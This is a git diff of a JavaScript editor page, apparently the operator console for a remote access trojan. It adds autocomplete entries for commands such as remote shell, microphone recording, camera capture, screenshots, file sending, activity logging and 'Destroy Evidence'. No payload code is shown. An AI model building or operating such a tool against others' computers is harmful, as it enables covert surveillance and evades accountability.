@@ -42,7 +42,7 @@ const donePlaying = () => {
 };
 
 const istereo = (x) => {
- editor.session.insert(editor.getCursorPosition(), '\nPC.Play("/Assets/' + x + '.mp3");');
+ editor.session.insert(editor.getCursorPosition(), '\nPC.Play("https://raw.githubusercontent.com/A5H1Q/The-Flying-Dutchman/master/Assets/' + x + '.mp3");');
  //  editor.getSession().setValue(editor.getValue() + 'PC.Play("Assets/' + x + '.mp3")');
 };
 
@@ -261,29 +261,56 @@ editor.getSession().setMode("ace/mode/javascript");
 editor.container.style.lineHeight = 1.7;
 editor.setOptions({
  theme: "ace/theme/clouds",
- enableBasicAutocompletion: true,
- enableLiveAutocompletion: true,
  showPrintMargin: false,
  fontSize: "13px",
  maxLines: Infinity,
+ enableBasicAutocompletion: [
+  {
+   getCompletions: (editor, session, pos, prefix, callback) => {
+    callback(null, [
+     {value: "PC.Excape();", meta: "Execute Batch script and Escape()"},
+     {value: "PC.Escape();", meta: "Destroy Evidence and Escape"},
+     {value: "PC.Marco();", meta: "Returns Polo if Online"},
+     {value: "PC.Close();", meta: "End Execution"},
+     {value: "PC.Update();", meta: "Updates self"},
+     {value: "PC.Hibernate();", meta: "Hibernate till date"},
+     {value: "PC.Revive();", meta: "End Hibernation  "},
+     {value: "PC.Notify();", meta: "Notifies power schedule"},
+     {value: "PC.Rename();", meta: "Renames RAT"},
+     {value: "PC.Flash();", meta: "Flashes Screen, Visual Indication"},
+     {value: "PC.Vbs();", meta: "Runs .VBS Script"},
+     {value: "PC.Bat();", meta: "Runs .Bat Script"},
+     {value: "PC.Shell();", meta: "Runs Shell Commands"},
+     {value: "PC.Speak();", meta: "Text to Speech"},
+     {value: "PC.Play();", meta: "Play a Remote (mp3) Audio File (URL)"},
+     {value: "PC.Mic();", meta: "Records audio for 'x' ms"},
+     {value: "PC.Lock();", meta: "Select Target"},
+     {value: "PC.Info();", meta: "Shows Info box"},
+     {value: "PC.Warn();", meta: "Shows Warning Box"},
+     {value: "PC.Error();", meta: "Shows Error box"},
+     {value: "PC.Msgbox(x,y);", meta: "Shows Msg Box fo 'y' ms"},
+     {value: "PC.Google();", meta: "Googles selected Text"},
+     {value: "PC.Web();", meta: "Navigates to 'x' url"},
+     {value: "PC.Type();", meta: "Types custom text"},
+     {value: "PC.Screenshot();", meta: "Takes a Screenshot"},
+     {value: "PC.Camera();", meta: "Captures a Photo"},
+     {value: "PC.Disk();", meta: "Retrieves Disk Info"},
+     {value: "PC.Tree();", meta: "Retrieves Disk Info"},
+     {value: "PC.Send();", meta: "Sends a File"},
+     {value: "PC.Zip();", meta: "Zip a folder"},
+     {value: "PC.Unzip();", meta: "Unzips file"},
+     {value: "PC.Health();", meta: "Reports back working conditions"},
+     {value: "PC.Log();", meta: "Logs every Activity"},
+     {value: "PC.Delay();", meta: "Pause Execution temporarily for 'x' ms"},
+     {value: "PC.Clone();", meta: "Initiate Clone Operations"},
+     {value: "PC.Noclone();", meta: "Stops Cloning op"},
+    ]);
+   },
+  },
+ ],
+ enableLiveAutocompletion: true,
 });
 
-var staticWordCompleter = {
- getCompletions: function (editor, session, pos, prefix, callback) {
-  var wordList = ["sys", "sys.play()", "lock"];
-  callback(
-   null,
-   wordList.map(function (word) {
-    return {
-     caption: word,
-     value: word,
-     meta: "Flying Dutchman",
-    };
-   })
-  );
- },
-};
-editor.completers = [staticWordCompleter];
 // Initial Program
 editor.getSession().setValue("// |==============================================|\n// |  Program-1\n// |  Description: Delete RATs from all systems.\n// |  Requirements: Secret Key\n// |________________________________________________|\n\nvar pc1='TBN';\nPC.Lock(pc1);\nPC.Delay(02);\nPC.Cmd(2000);\n");
 editor.on("change", function (e) {
